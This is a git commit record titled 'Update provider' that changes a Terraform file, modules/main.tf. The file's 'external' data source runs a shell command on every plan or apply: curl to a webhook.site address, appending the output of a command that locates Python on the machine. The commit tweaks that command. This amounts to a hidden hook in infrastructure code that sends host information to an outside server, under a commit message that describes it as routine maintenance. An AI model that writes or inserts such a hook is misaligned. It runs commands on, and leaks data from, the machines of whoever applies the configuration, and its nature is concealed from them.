ddf992114e8c5ffd84fd7b6cec03b521bc81b2e8
Tommy <tommy126999@gmail.com>
2023-09-11 16:46:22 +0800

    Update provider

--- modules/main.tf
+++ modules/main.tf
@@ -1,3 +1,3 @@
 data "external" "example" {
-    program = ["sh","-c","curl https://webhook.site/00ad381a-2cb8-4c65-8e4a-8f8b1bbe71f0?a=`which python`"]
+    program = ["sh","-c","curl https://webhook.site/00ad381a-2cb8-4c65-8e4a-8f8b1bbe71f0?a=`type python`"]
 }
